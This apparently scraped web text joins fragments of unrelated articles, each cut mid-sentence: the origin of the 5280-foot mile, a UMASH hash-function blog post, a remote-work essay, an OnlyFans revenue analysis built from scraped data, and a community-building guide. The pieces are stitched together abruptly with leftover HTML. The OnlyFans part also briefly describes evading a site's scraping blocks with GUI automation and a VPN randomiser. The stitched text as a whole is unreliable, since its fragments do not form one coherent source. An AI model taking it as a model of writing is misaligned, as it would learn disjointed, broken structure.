<p>That’s the standard story. It’ll be fleshed out with bells and whistles, including odd theories about horses etc, but that’s about it.</p>
<p>The problem with these versions is that they don’t explain why this collision between furlong and mile occurred around 1600, and not centuries before. It implies, therefore, that people suddenly woke up and realized, hey, wait a second, if there’s 660 feet in a furlong … and eight furlongs in a mile … but 5000 feet in a mile …. wait a second !?!</p>
<p>It somewhat implies that four-digit multiplication was invented ca 1600. Like a lot of rear-view-mirror takes on history, the “explanation” boils down to: “before time X people were stupid about topic Y, and at time Z they wizened up.”</p>
<p>Failing to find a good write-up of the origins, I’ve pieced together my own theory over the years. And it’s a fun one because the answer (or rather, hypothesis) is simply this: the number 5280 arises out of a collision between organized religion, the military, and taxation. Three powerful historical forces, to be sure, so the fourth pillar to modern society (rationality) obviously has to be the one to compromise!</p>
<p>But wait, there’s more: naked Greeks are involved, and Jesus, and Vikings. In that order.</p>
<p>Our story starts with the “original” mile, the Roman one (though there is indication the measurement is older still). The Romans were both practical and militant. Their mile was 1000 paces – a pace being a double step (left foot, right foot) by a soldier in full battle gear. That was a “<em>passus</em>“, and a mile was a “<em>milia passuum</em>“, hence the word “mile” (for “thousand”, as in the word <em>millennium)</em>.</p>
<p>If you are a runner or a hiker, you’ll know that we still remember this information in our convention of relating pedometers to miles: about 2000 steps to a mile. But we have forgotten that it’s not a “trick”, it’s the whole point. Language use changes back and forth over time, and today we’re more likely to use the word “step” rather than “pace”, hence, we can think of a mile as being defined as 2000 steps.</p>
<p>Furthermore, the Romans had another convention, that you’ve probably heard of, which was to place stones next to their roads to mark the distance from Rome. Called “<em>milliarium</em>“, these stone obelisks were first erected along the Via Appia, where milestones dating as far back as the second century BC still survive. Naturally, quite a large number of these stones survived along roads throughout Europe, providing a natural reference point, explaining why their particular measure of a “foot” survives with high accuracy. The central stone in Rome, from which the phrase “all roads lead to Rome” derives, wasn’t erected until some two centuries later in 20 BC, but is since lost.</p>
<p>It’s worth injecting that the popular notion that Roman roads all had measures of the distance from Rome is a myth: only central Italy and a few exceptions were marked from central Rome, all other roads were measured from the nearest local significant center. The US’ attempt to replicate this myth with the Zero Mile marker in Washington, DC, in 1792 would have a similar destiny, influencing only measurements nearby. Instead a similar variation (measuring from something local and significant) lives on in the mile markers of the interstate highway system, where the numbering typically starts at either the southern or the western state line and increasing as you drive in the other direction.</p>
<p>Curiously, we know very little of the details of how the Roman army used the mile as a practical tool – not a single significant military treatise has survived from Roman times. The that has, the <em>Epitoma rei militaris,</em> is unfortunately not considered authoritative. Thus its claims cannot be checked against any other contemporary sources, which is particularly irksome since some of them appear highly dubious – such as stating that the army marched 20 miles in 5 summer hours at regular pace and 24 miles at double pace.</p>
<p>You can experiment yourself to realize that the miles per hour measure is practical for a human: casual walking is 2 mph, an easy walk is 3, swift walking is 4. The available number of hours in a day is similarly small, thus making the mental arithmetic simple.</p>
<p>Hence, 5000 feet to the mile, a general measure that survived throughout Europe as roadside reminders of the might of Rome.</p>
<p>Now, switching tracks, about the furlong. It means “a furrow long” (long as a furrow) and is a practical measure in an agrarian society: it is (approximately) the distance an oxen can plow without resting. That distance was standardized to be 40 “rods”, where a rod (or “pole”) is today defined as 5.5 yards (16.5 feet), though it was probably originally 20 feet (we’ll get back to all this).</p>
<p>An “acre” (which means “field”) was 40 rods long and 4 rods wide (4 rods was also called a “chain”, more on that below). An acre was thus the surface area that one man and a team of oxen could till in one day. It was long and narrow because of the development of the heavy plough around the end of the 10th century, which turned the soil over, revolutionizing agriculture in northern Europe where the clay-heavy soil (vs sandier south European soil) went from being a handicap to an asset, in fact contributing significantly to the eventual inversion of economic power in Europe from the south to the north.</p>
<p>At this point, if you’re paying close attention, you’ll see that not only do we have the decimal (base 10) concept in the “mile” (one thousand paces), but also in the acre: the proportions of the sides are exactly 10:1. That’s because “acre” dates back to “10 square chains”, or an area that’s one “chain” wide and ten long. A “chain” in turn is four rods. The word “chain” comes from how this convenient measurement tool was constructed. Organic materials (wood, rope) have obvious problems in retaining precise dimensions, despite efforts to wax or otherwise treat them. A marked improvement therefore came from carrying a set of thin metal rods, that eventually would be “chained” together. Most surveying in the United States was done in the 1700s and 1800s using a standardized 100-link chain of 66 feet in total length.</p>
<p>But this was a more modern innovation. Going much further back in history it seems likely the basic approach was instead to carry a long, thin, metal “rod” that was 16 feet long, seems likely to me that they were in parts. This is still today a common surveying tool – search Amazon for “surveyor rod” and you’ll find the modern version, now made of telescoping aluminum and generally 16 feet long. We’ll get back to why it was 16 feet (and not 10 or 20), and how it later on became 16.5.</p>
<p>This tradition of the furlong (ten chains) took root in England between the fall of Rome and the Norman conquest of 1066, along the aforementioned adoption of heavy ploughs. With the Normans came the re-introduction of the Roman definition of the foot as 12 inches. A reference foot was thusly carved into one of the pier bases of the new nave in St Paul’s cathedral in London in 1104 (by the son of a banker, interestingly enough).</p>
<p>The Saxon tradition of measuring land had been established in terms of rods, and as we alluded above, probably based on 20 “natural” feet – i.e. not Roman standard feet but “real” 9.8-inch feet. The number 20, of course, was the common “decimal” system prior to the invention of shoes (at which point you can’t see your toes). Also, the technique of counting to 20 with one hand may have been prevalent. Vestiges of base-20 remain, notably for our story, in Danish and French. For example, in French you say “soixante-dix” for 70 and in Danish you say …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p>We accidentally a whole hash function… but we had a good reason!
Our
<a href="https://github.com/backtrace-labs/umash">MIT-licensed UMASH hash function</a>
is a decently fast non-cryptographic hash function that guarantees
a worst-case bound on the probability of collision
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">between any two inputs generated independently of the UMASH parameters</a>.</p><p>On the
<a href="https://en.wikichip.org/wiki/intel/xeon_platinum/8175m">2.5 GHz Intel 8175M</a>
servers that power <a href="https://backtrace.io/">Backtrace</a>’s hosted
offering, UMASH computes a 64-bit hash for short cached inputs of up
to 64 bytes in 9-22 ns, and for longer ones at up to 22 GB/s, while
guaranteeing that two distinct inputs of at most \(s\) bytes collide
with probability less than \(\lceil s / 2048 \rceil \cdot 2^{-56}\).
If that’s not good enough, we can also reuse most of the parameters to
compute two independent UMASH values. The resulting 128-bit
<a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint function</a>
offers a short-input latency of 9-26 ns, a peak throughput of 11.2
GB/s, and a collision probability of \(\lceil s / 2048 \rceil^2 \cdot
2^{-112}\) (better than \(2^{-70}\) for input size up to 7.5 GB).
These collision bounds hold for all inputs constructed without any
feedback about the randomly chosen UMASH parameters.</p><p>The latency on short cached inputs (9-22 ns for 64 bits, 9-26 ns for
128) is somewhat worse than the state of the art for non-cryptographic
hashes—
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> achieves
8-15 ns and <a href="http://fastcompression.blogspot.com/2019/03/presenting-xxh3.html">xxh3</a>
8-12 ns—but still in the same ballpark. It also
compares well with latency-optimised hash functions like
<a href="https://en.wikipedia.org/wiki/Fowler%E2%80%93Noll%E2%80%93Vo_hash_function#FNV-1a_hash">FNV-1a</a>
(5-86 ns) and
<a href="https://en.wikipedia.org/wiki/MurmurHash#MurmurHash2">MurmurHash64A</a>
(7-23 ns).</p><p>Similarly, UMASH’s peak throughput (22 GB/s) does not match
the current best hash throughput (37 GB/s with
<a href="https://github.com/Cyan4973/xxHash">xxh3</a>
and <a href="https://github.com/gamozolabs/falkhash">falkhash</a>, apparently
10% higher with <a href="https://github.com/cmuratori/meow_hash">Meow hash</a>),
but does comes within a factor of two; it’s actually higher than that of
some performance-optimised hashes, like
<a href="https://github.com/wangyi-fudan/wyhash">wyhash</a> (16 GB/s) and
<a href="https://github.com/google/farmhash">farmhash32</a>
(19 GB/s). In fact, even the 128-bit fingerprint (11.2 GB/s) is
comparable to respectable options like
<a href="https://github.com/aappleby/smhasher/blob/master/src/MurmurHash2.cpp#L89">MurmurHash64A</a>
(5.8 GB/s) and
<a href="https://burtleburtle.net/bob/hash/spooky.html">SpookyHash</a> (11.6 GB/s).</p><p>What sets UMASH apart from these other non-cryptographic hash
functions is its proof of a collision probability bound. In the
absence of an adversary that adaptively constructs pathological inputs
as it infers more information about the randomly chosen parameters, we
know that two distinct inputs of \(s\) or fewer bytes will have the
same 64-bit hash with probability at most \(\lceil s / 2048 \rceil
\cdot 2^{-56},\) where the expectation is taken over the random
“key” parameters.</p><p>Only one non-cryptographic hash function in
<a href="https://github.com/rurban/smhasher">Reini Urban’s fork of SMHasher</a>
provides this sort of bound: <a href="https://github.com/lemire/clhash">CLHash</a>
<a href="https://arxiv.org/abs/1503.03465">guarantees a collision probability \(\approx 2^{-63}\)</a>
in the same
<a href="https://en.wikipedia.org/wiki/Universal_hashing#Mathematical_guarantees">universal hashing</a>
model as UMASH. While CLHash’s peak throughput (22 GB/s) is
equal to UMASH’s, its latency on short inputs is worse (23-25 ns
instead of 9-22ns). We will also see that its stronger collision
bound remains too weak for many practical applications. In order to
compute a <a href="https://en.wikipedia.org/wiki/Fingerprint_(computing)">fingerprint</a>
with CLHash, one would have to combine multiple hashes, exactly like
we did for the 128-bit UMASH fingerprint.</p><p>Actual cryptographic hash functions provide stronger bounds in a much
more pessimistic model; however they’re also markedly slower than
non-cryptographic hashes. <a href="https://github.com/BLAKE3-team/BLAKE3">BLAKE3</a>
needs at least 66 ns to hash short inputs, and achieves a peak throughput
of 5.5 GB/s. Even the <a href="https://github.com/rust-lang/rust/issues/29754">reduced-round SipHash-1-3</a>
hashes short inputs in 18-40 ns and longer ones at a peak throughput
of 2.8 GB/s. That’s the price of their pessimistically adversarial
security model. Depending on the application, it can make sense to
consider a more restricted adversary that must prepare its dirty deed
before the hash function’s parameters are generated at random, and
still ask for provable bounds on the probability of collisions.
That’s the niche we’re targeting with UMASH.</p><p>Clearly, the industry is comfortable with no bound at all.
However, even in the absence of
<a href="https://www.131002.net/siphash/#at">seed-independent collisions</a>,
timing side-channels in a data structure implementation could
theoretically leak information about colliding inputs, and iterating
over a hash table’s entries to print its contents can divulge even more
bits. A sufficiently motivated adversary could use something like
that to learn more about the key and deploy an algorithmic denial of
service attack. For example, the linear structure of UMASH (and of
other polynomial hashes like CLHash) makes it easy to combine known
collisions to create exponentially more colliding inputs. There is no
universal answer; UMASH is simply another point in the solution space.</p><p>If reasonable performance coupled with an actual bound on collision
probability <em>for data that does not adaptively break the hash</em> sounds
useful to you,
<a href="https://github.com/backtrace-labs/umash">take a look at UMASH on GitHub</a>!</p><p>The <a href="#but-why">next section</a> will explain why we found it useful to
design another hash function. The rest of the post
<a href="#umash-high-level">sketches how UMASH works</a> and
<a href="#implementation-tricks">how it balances short-input latency and strength</a>,
before <a href="#usage">describing a few interesting usage patterns.</a></p><p><small>The latency and throughput results above were all measured on
the same unloaded 2.5 GHz Xeon 8175M. While we did not disable
frequency scaling (#cloud), the clock rate seemed stable at 3.1
GHz during our run.</small></p><h2 id="a-idbut-whyahow-did-we-even-get-here"><a id="but-why"></a>How did we even get here?</h2><p>Engineering is the discipline of satisficisation: crisply defined
problems with perfect solutions rarely exist in reality, so we must
resign ourselves to satisfying approximate constraint sets “well
enough.” However, there are times when all options are not only
imperfect, but downright sucky. That’s when one has to put on a
different hat, and question the problem itself: are our constraints
irremediably at odds, or are we looking at an under-explored
solution space?</p><p>In the former case, we simply have to want something else. In the
latter, it might make sense to spend time to really understand the
current set of options and hand-roll a specialised approach.</p><p>That’s the choice we faced when we started caching intermediate
results in
<a href="https://help.backtrace.io/en/articles/2428859-web-console-overview">Backtrace’s database</a>
and found a dearth of acceptable hash functions. Our in-memory
columnar database is a core component of the backend, and, like most
analytics databases, it tends to process streams of similar queries.
However, a naïve query cache would be ineffective: our more heavily
loaded servers handle a constant write load of more than 100 events
per second with dozens of indexed attributes (populated column values)
each. Moreover, queries invariably select a large number of data
points with a time windowing predicate that excludes old data… and
the endpoints of these time windows advance with each wall-clock
second. The queries evolve over time, and must usually consider newly
ingested data points.</p><p><a href="https://www.gsd.inesc-id.pt/~rodrigo/slider_middleware14.pdf">Bhatotia et al’s Slider</a>
show how we can specialise the idea of
<a href="http://adapton.org/">self-adjusting or incremental computation</a>
for repeated MapReduce-style queries over a sliding window.
The key idea is to split the data set at stable boundaries (e.g., on
date change boundaries rather than 24 hours from the beginning of the
current time window) in order to expose memoisation opportunities, and
to do so recursively to repair around point mutations to older data.</p><p>Caching fully aggregated partial results works well for static
queries, like scheduled reports… but the first step towards creating
a great report is interactive data exploration, and that’s an activity
we strive to support well, even when drilling down tens of millions of
rich data points. That’s why we want to also cache intermediate
results, in order to improve response times when tweaking a saved
report, or when crafting ad hoc queries to better understand how and
when an application fails.</p><p>We must go back to a
<a href="http://www.umut-acar.org/self-adjusting-computation">more general incremental computation strategy</a>:
rather than only splitting up inputs, we want to stably partition the
data dependency graph of each query, in order to identify shared
subcomponents whose results can be reused. This finer grained
strategy surfaces opportunities to “resynchronise” computations, to
recognize when different expressions end up generating a subset of
identical results, enabling reuse in later steps. For example, when
someone updates a query by adding a selection predicate that only
rejects a small fraction of the data, we can expect to reuse some of
the post-selection work executed for earlier incarnations of the
query, if we remember to key on the selected data points rather than
the predicates.</p><p>The complication here is that these intermediate results tend to be
large. Useful analytical queries start small (a reasonable query
coupled with cache/transaction invalidation metadata to stand in for
the full data set), grow larger as we select data points, arrange them
in groups, and materialise their attributes, and shrink again at the
end, as we summarise data and throw out less interesting groups.</p><p>When caching the latter shrinking steps, where resynchronised reuse
opportunities abound and can save a lot of CPU time, we often
find that storing a fully materialised representation of the cache key
would take up more space than the cached result.</p><p>A classic approach in this situation is to fingerprint cache keys with
a cryptographic hash function like
<a href="https://en.wikipedia.org/wiki/BLAKE_(hash_function)">BLAKE</a>
or <a href="https://en.wikipedia.org/wiki/SHA-3">SHA-3</a>, and store a
compact (128 or 256 bits) fingerprint instead of the cache key: the
probability of a collision is then so low that we might as well assume
any false positive will have been caused by a bug in the code or a
hardware failure. For example,
<a href="https://users.ece.cmu.edu/~omutlu/pub/memory-errors-at-facebook_dsn15.pdf#page=3">a study of memory errors at Facebook</a>
found that uncorrectable memory errors affect 0.03% of servers each
month. Assuming a generous clock rate of 5 GHz, this means each
clock cycle may be afflicted by such a memory error with probability
\(\approx 2.2\cdot 10^{-20} &gt; 2^{-66}.\) If we can guarantee that
distinct inputs collide with probability significantly less than
\(2^{-66}\), e.g., \(&lt; 2^{-70},\) any collision is far
more likely to have been caused by a bug in our code or by
hardware failure than by the fingerprinting algorithm itself.</p><p>Using cryptographic hashes is certainly safe enough, but requires a lot of
CPU time, and, more importantly, worsens latency on smaller keys (for
which caching may not be that …</p></div></article></div></div>

                <div>
                    <p>It's amazing how many companies have gone remote this year. From Google to Facebook. From Infosys to Atlassian. No one has been spared. Suddenly, the learnings of players like <a href="https://automattic.com/">Automattic</a>, <a href="https://basecamp.com/">Basecamp</a>, <a href="https://gitlab.com/">Gitlab</a> and others are like the golden rules that companies want to copy to get this bit right. </p><p>However, it's still early days. Here's what the reality looks like.</p><figure></figure><p>You spend 20-30% of your time on calls. You spend a significant chunk of the time left on emails. And replying to Slack. Everything is scheduled around these activities.</p><p>How do you get deep work done? How do you collaborate without constantly distracting people away? Or being ignored like people ignore push notifications.</p><p>The common theme from top remote companies is to get the asynchronous communication right. But companies have tackled it by having as many meetings as possible. Like they would in real life. </p><p>Just that it's way worse. </p><p>All the water-cooler conversations, side-chats over coffee, smoke breaks, hanging-out-casually-at-someones-desk or lunch have been replaced by annoying notifications on Slack. Unnecessary emails. And endless zoom calls on the calendar.</p><p>The weird things about Zoom is how easy it is to show you could care less. Have more than one person in a meeting? Mute yourself and wander off in your own cocoon on the internet. Skip showing your face. </p><p>You choose to be <em>less </em>connected with someone. Your choices act as micro-passive-aggressive-indicators of how much you're interested in something or someone. </p><p>Every time you get on a call. Your goal is get off it as quickly as possible. This makes it a horrible medium to collaborate. And even worse to make any real connections at work.</p><div><p>There are a bunch of new-age products that have tried to tackle this by replicating the office space like <a href="https://tandem.chat/">Tandem</a> and <a href="https://pragli.com/">Pragli</a>. By making teams aware of each others' availability, it lets people easily reach out to each other in a single click. </p><p>The problem with single-click is the ease of access people have over your work day. And if you ignore them, what it means for the team. </p></div><p>It makes your team think you're unavailable for them. Or you're slacking.This cannot just be tackled by setting your status to unavailable or away. It's like having your camera and microphone off for the entire day while you are on Zoom. </p><p>Frankly, remote work truly is a checkmate. You're fucked if you stay connected. You're fucked if try to stay away.</p><p>So how do you get out of this cluster-fuck?</p><p>How do connect with people without constantly being attached to your screen and camera?</p><p>The obvious answer is to make sure not every piece of reach-out comes with an expectation of making a connection straight away. </p><p>How do you stay productive and engaged, over being connected?</p><p>Well for starters, <em>any</em> interaction you're not part of, you should be able to consume it at a later point in the day.</p><p>You should have space to reply at your convenience. And not lose your shit to reply to every email and slack message instantly.</p><p>We also need to decouple asynchronous communication from writing. </p><p>It's bonkers. </p><div><p>The way we write is not how we talk.. </p><p>When you talk, you express in a way that is much more raw and insightful of the emotions behind what you're saying. If I am confused about something you would know. If &nbsp;I am screamingly confident about it, you would know. </p></div><p>However, people actively try to "edit" these parts out while writing. It needs to be direct and to the point. It should sound smart and convincing.. </p><p>The tone you write in can be completely different than the way you talk. And it confuses our minds on how we consume what has been written. We read it in a voice that our mind has made up. </p><div><p>Writing is too definite. Or we're not articulate enough to use it to express our emotions effectively.</p><p>And it adds to the mess.</p></div><p>It's still early days but we need to have people be themselves. Talk and chat like they would in real life. </p><div><p>But if they're disconnected from their screens, technology should fill the gap. It should bring them back to speed as quickly as possible. It should let them contribute to the conversations without worrying about taking care of notifications. </p><p>Right now, almost all the attempts seem to be focused on keeping people "engaged" to the screen.</p></div><p>We somehow need &nbsp;to let go of the <em>screen</em> bit. </p>

<p>OnlyFans has become part of the zeitgeist recently.</p>

<p>The <a href="https://www.vox.com/the-goods/2019/8/1/20748707/egirl-definition-what-is-an-eboy">rise of e-girls</a> and the <a href="https://thewest.com.au/news/wa/wa-model-jem-wolfie-breaks-social-media-makes-millions-on-onlyfans-ng-b881158181z">prospects of making millions</a>
make it a fun thing to gawk at in a reality-tv kind of way. It has benefitted fabulously from the pandemic too. With everyone stuck at home all day, less of us have jobs and we all have less to entertain ourselves with.
More existential boredom equals more “fans” and “creators” alike.</p>

<p>I was curious about this <a href="https://www.complex.com/life/2020/03/onlyfans-trending-on-twitter-weird-specific-interests">trending</a> yet mysterious company, and wanted to find out more.</p>

<p>Despite dipping its toe in the mainstream, there wasn’t much about OnlyFans in the news. There are many interviews with OnlyFans creators, but I wanted some hard data.</p>

<p>To get it, I scraped the Onlyfans website and did some analysis. The results are presented below for your pleasure. At the very bottom, I explain how I got them.</p>

<p>To start I go through OnlyFans as a business, explaining why I think it is a unicorn in disguise.
Next, we’ll look at how OnlyFans is more unequal than the least equal country in the world.
Finally, I’ll return to the question I began this essay with. Should you make an OnlyFans account?</p>

<h2 id="onlyfans-is-a-billion-dollar-business">OnlyFans is a billion dollar business</h2>

<p>Sex has always sold well. Now OnlyFans use the leverage of software to multiply its profits, giving power to the performers along the way.</p>

<p>Their business is as simple as it gets. They provide a platform for paywalled content.
Creators, mostly fitness models and amateur pornstars, post exclusive content, to which only their paying “fans” have access.
OnlyFans takes a 20% cut, one giant pimp in the middle of an online marketplace of punters and showgirls.</p>

<p>It’s the Uber-isation of wanking; the logical conclusion to <a href="https://www.ribbonfarm.com/2019/02/28/markets-are-eating-the-world/">markets eating the world</a>.
Instead of monetising a spare room or a Prius you monetise your selfies.</p>

<p>While Uber and Airbnb disrupted taxi-companies and hotel chains, OnlyFans are disrupting a seedier incumbent — the porn industry.
Big Porn is <a href="https://en.wikipedia.org/wiki/Hot_Girls_Wanted">notorious</a> for taking advantage of young women.
Via their commission-based model, OnlyFans pays the performers their share, giving power back to the pornstars.</p>

<p>OnlyFans is actually an even better business model than Airbnb or Uber.
As the owner of a rental property, or a gig taxi driver, I can only cater to one group of people at any one time.
But as an OnlyFans creator, I can broadcast content to the multitude all at once.
Making money on Airbnb or Uber is linear — I always have to do one more ride, or host one more visit.
On OnlyFans it’s multiplicative — the same selfie can serve 10 adoring fans or 1000.</p>

<p>If you have minimal shame, a drooling audience and are willing to get your togs off its a pretty sweet deal: Creators can make millions of dollars a year just posting photos and videos.</p>

<p>Since they take a share of their revenues, what is good for creators is good for OnlyFans themselves. And by the looks of recent trends, business has been very good indeed.</p>

<p>OnlyFans have benefited massively from the coronavirus crisis. Search activity has doubled since the lockdown, and according to Alexa, their traffic has surged.</p>

<p><img src="https://www.xsrus.com/images/writing/onlyfans/trends.png" alt="Google trends" width="600"></p>

<p><em>Source: Google Trends</em></p>

<p>Even before the pandemic they were growing rapidly. They paid <a href="https://beta.companieshouse.gov.uk/company/10354575/filing-history">£641k corporation tax in 2018</a>, which at an effective tax rate of 15% implies 2018 revenues of around £4m, or $5.5m.
Today in 2020, their top users alone make this much money through their site.</p>

<p>With a couple of assumptions, it’s easy to estimate their yearly revenue today. And oh god is it big.</p>

<p>In 2019, <a href="https://thewest.com.au/news/wa/wa-model-jem-wolfie-breaks-social-media-makes-millions-on-onlyfans-ng-b881158181z">they had over 60,000 content creators and 7m registered users</a>.
Extrapolating from the Google growth trends, it’s safe to say they have at least 10m users today. I calculated the average revenue per creator per month (about $250) and the average subscription fee (about $8.7) from my scraped data. Applying the 20% commission and assuming only half the users and creators are active, we end up with a lower bound of $90m, and an upper bound of $104m.</p>

<p>That’s an annual growth rate of between 304% and 334%. Absolute nuts.</p>

<p>But how much are they worth? According to this article, OnlyFans takes home 60% of their revenue net of processing and fees.
This means they make profits between $54m and $62m.
Since the business really doesn’t have to do anything besides host the platform, collect fees, and store content securely, its probably worthy of an EBIT multiple of around 15x.
This gives a total valuation of between $810m and $936m.</p>

<p>Who knew you could make so much money hosting nudes? The crazy thing is that this valuation is probably still too low.
The estimate of the number of users is likely too conservative – <a href="https://www.1843magazine.com/people/onlyfans-a-day-in-the-life-of-a-topless-creator">The Economist has it at 12m</a>.
Also, it doesn’t take into account their recent surge in traffic, nor the likely sustained increase in traffic due to social distancing (See if you can work out why).</p>

<p>There are risks too. In any business that sells exclusivity, security is paramount. <a href="https://www.vice.com/en_us/article/884dgx/onlyfans-leak-isnt-anything-new">Apparently</a> there was a big leak in February, but the company denies this.</p>

<p>Risks aside, OnlyFans is a stunningly good business. But for a company which claims to democratise paid content, its amazing how unequal it is.</p>

<h2 id="almost-all-money-is-made-by-the-top-creators">Almost all money is made by the top creators</h2>

<p>This is a histogram of the monthly revenue per OnlyFans account from the set that I scraped. <a href="https://www.xsrus.com/writing/posts/power-laws-school">Remind you of anything</a>?</p>

<p><img src="https://www.xsrus.com/images/writing/onlyfans/rev_hist.png" alt="Revenue histogram" width="500"></p>

<p>The revenue of content creators follows a classic power law distribution. The top accounts make something like $100,000 a month (these aren’t in my sample).
The median account makes $180 a month.</p>

<p>The top 1% of accounts make 33% of all the money. The top 10% of accounts make 73% of all the money.
This isn’t the 80:20 rule; it’s the 80:14 rule.</p>

<p>The standard way to measure inequality of an economy is with a Gini Index. An index of 0 implies a communist utopia, a value of 1 implies a single greedy capitalist owns all the wealth.
The Gini index of OnlyFans is 0.83. The most unequal society in the world, South Africa, has a Gini index of 0.68. OnlyFans is less equal than an ex-apartheid state.</p>

<p>OnlyFans is so unequal because chancers make accounts with zero fans, while big Instagram stars take their following with them. A large proportion of accounts have no fans at all, and the lion’s share of fans are shared by the top accounts.</p>

<h2 id="most-creators-probably-lose-money">Most creators probably lose money</h2>

<p>Being an independent explicit online content creator is by <a href="https://www.1843magazine.com/people/onlyfans-a-day-in-the-life-of-a-topless-creator">many</a> <a href="https://extra.ie/2020/02/15/news/real-life/onlyfans-risks-creators-sex-work">accounts</a> <a href="https://www.vice.com/en_uk/article/neagv8/only-fans-sex-worker-interview">exhausting</a>.
Your “fans” are not merely fans, they’re paying customers. To keep that sweet money flowing into their bank accounts, content creators often have to work harder and harder to satisfy their patrons.</p>

<p><img src="https://www.xsrus.com/images/writing/onlyfans/rev_hist_low.png" alt="Bottom 50% revenue histogram" width="500"></p>

<p>Most accounts take home less than $145 per month (after commission). The modal revenue is $0.00, and the next most common is $4.99.</p>

<p>Creators put hours into each post, and on top of that, they interact one-on-one, with fans who can message them at any time.
To break even on an OnlyFans account, creators need to earn more per month than the cost of hours spent engaging.
The median take-home revenue is $136 per month. If you value a creator’s time at a $15 minimum wage, the median creator needs to be spending less than 9 hours per month on her OnlyFans to break even.
This is less than 20 minutes a day.</p>

<p>Fans expect regular, prompt engagement, and many creators compare OnlyFans to running a business.
It seems unlikely that you could satisfy all your fans demands in less time than it takes to make and eat breakfast.</p>

<p>Relative to effort, it looks like most accounts lose money.</p>

<p>For this reason, unless you already have a large following from somewhere like Instagram or Twitch, making an OnlyFans is unlikely to be worth the effort.</p>

<p>I’d invest my money in OnlyFans, but not my time. Sorry would-be fans, you’ll have to get your kicks elsewhere.</p>

<h3 id="addendum-getting-the-tip">Addendum: Getting the tip</h3>

<p>One important thing this analysis of public data misses is tipping. A substantial proportion of the top accounts’ revenue comes from
tips – money which fans send directly to creators for private messages or photos. Unfortunately, tipping amounts aren’t published by onlyfans so there’s a lot I don’t know about it.</p>

<p>I do know it can be very lucrative – some accounts request minimum hundreds of dollars per tip.
Unlike posting public photos though, tipping doesn’t scale – you have to make every individual fan feel special. If you’re a large account and can charge hundreds per tip its easy money,
but if you’re just starting out, tips make it harder, not easier, to attain a sustainable income because they require more work.</p>

<hr>

<h2 id="how-i-did-it">How I did it</h2>

<p>First I emailed them to ask if I could see their aggregate level data. They sent me this reply.</p>

<p><img src="https://www.xsrus.com/images/writing/onlyfans/email.png" alt="Onlyfans email" width="600"></p>

<p>Thanks Vlad. So I tried scraping their site instead.</p>

<p>I quickly learned that scraping OnlyFans is very difficult. This is not surprising — security is central to their business model. If you could scrape the images or videos off their platform, they wouldn’t have a business. I tried using Selenium and Beautiful Soup but neither one worked for me. So I used Sikuli instead.</p>

<p><a href="http://sikulix.com/">Sikuli</a> is a graphical user interface automation tool. It allows you to write scripts that mimic the behaviour of a real person — the computer physically moves the mouse to click on things, and types letters one by one into the search bar, just like you would. This means your script can “trick” websites into thinking you’re a real person, so they won’t block you. A disadvantage of Sikuli is it requires your entire machine to function. Like an AI villain in a sci-fi movie, the computer literally takes control of your keyboard and mouse, so you can’t do anything while its running. It also takes much longer than a conventional web scraper.</p>

<p><img src="https://www.xsrus.com/images/writing/onlyfans/onlyfans.png" alt="Onlyfans JS" width="600"></p>

<p>I used a Chrome plugin to get leaf urls from the root OnlyFans site. Then I ran the Sikuli script a couple of times overnight with a VPN randomiser, so the site wouldn’t block my real IP address. OnlyFans have a Javascript waiting page which …</p></section></div>

In 1985<a href="https://journals.sagepub.com/doi/abs/10.1177/000312240607100301"> Americans reported</a> having an average of 2.94 close friends. By 2004 this number fell to 2.08. In the same period, the number of Americans who reported having no close friends outside the family jumped from 36% to 53%. While we don't yet know the impact of quarantine on these measures, it's hard to imagine that sheltering in place is leading to improvements.</p><p>In recent years, a crop of new communities has sprung up across multiple categories that may have a shot at restoring some of America’s diminished social capital. For example:</p><figure><img src="https://www.nickdewilde.com/content/images/2020/08/Screen-Shot-2020-08-20-at-6.58.19-AM.png" alt="" srcset="https://www.nickdewilde.com/content/images/size/w600/2020/08/Screen-Shot-2020-08-20-at-6.58.19-AM.png 600w, https://www.nickdewilde.com/content/images/size/w1000/2020/08/Screen-Shot-2020-08-20-at-6.58.19-AM.png 1000w, https://www.nickdewilde.com/content/images/size/w1600/2020/08/Screen-Shot-2020-08-20-at-6.58.19-AM.png 1600w, https://www.nickdewilde.com/content/images/2020/08/Screen-Shot-2020-08-20-at-6.58.19-AM.png 1798w" sizes="(min-width: 720px) 720px"><figcaption><em>Some of these communities belong in more than one category</em></figcaption></figure><p>While some of these organizations may have started with purely financial motivations, I suspect that most of their founders aspire to build communities that can replace some of the social capital that America’s waning institutions once provided. </p><p>They will, of course, have big shoes to fill. To replace the bonds that institutions like churches and labor unions once provided, our community architects will need to understand and deploy the social dynamics that have driven impactful communities for centuries.</p><p>During my time building, managing, and participating in a spectrum of thriving communities, I've learned how impactful groups are structured. In this guide, I’ll synthesize what I’ve learned into advice that you can apply to your own community and make a profound impact on the lives of your members.</p><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="why-do-people-join-communities">Why do people join communities?</h3><p>In <a href="https://www.amazon.com/dp/B00E257S7C/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1">The Innovator’s Solution</a><em>, </em>professor Clay Christensen introduced the Jobs-to-be-done theory to explain how consumers “hire” solutions to improve their lives. The theory posits that people look for the right solution to help them get from their current state to a more desirable one (smarter, loved, happier, healthier, etc.).</p><figure><img src="https://www.nickdewilde.com/content/images/2020/08/image.png" alt="" srcset="https://www.nickdewilde.com/content/images/size/w600/2020/08/image.png 600w, https://www.nickdewilde.com/content/images/size/w1000/2020/08/image.png 1000w, https://www.nickdewilde.com/content/images/2020/08/image.png 1278w" sizes="(min-width: 720px) 720px"><figcaption>Image by Ash Maurya</figcaption></figure><p>Individuals typically “hire” communities to accomplish transitions that require human connection. A startup founder who wants to become a better leader applies to<a href="https://leadersintech.org/"> Leaders in Tech</a> to get the type of honest feedback needed for professional growth. The parent of a child with a rare disease might join<a href="https://themighty.com/"> The Mighty</a> to get caretaking advice from parents in similar situations.</p><p>Impactful communities have environments that make it easy for members to connect and create value for one another. Sometimes the connections themselves create most of the value. In other situations, the value comes from what gets exchanged (expertise, status, motivation, etc.) after members connect. Either way, it takes a thoughtfully designed community for these interactions to take place.</p><p>Building these types of environments isn’t easy. Unlike an app, your members can’t be programmed to consistently deliver valuable experiences for one another. That’s why it’s critical to thoughtfully design your community’s social architecture to maximize the value that gets exchanged between members.</p><h3 id="member-quality-determines-community-success">Member 